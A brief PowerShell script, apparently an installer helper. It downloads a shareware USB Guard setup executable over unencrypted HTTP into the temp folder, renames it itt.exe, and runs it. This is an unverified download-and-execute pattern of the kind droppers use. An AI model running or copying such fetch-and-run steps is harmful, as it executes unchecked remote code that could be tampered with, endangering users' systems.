# Define the URL and the destination file path
$url =  "http://www.zbshareware.com/downloads/setup/USBGuardSetup6.9.exe" 
$dest = "$env:temp/itt.exe"

# Start a job to download the file
$job = Start-Job -ScriptBlock {
    param($url, $dest)
    Invoke-WebRequest -Uri $url -OutFile $dest
} -ArgumentList $url, $dest

# Wait for the job to complete
Wait-Job $job

Start-Process -FilePath "$env:temp/itt.exe" -ArgumentList $dest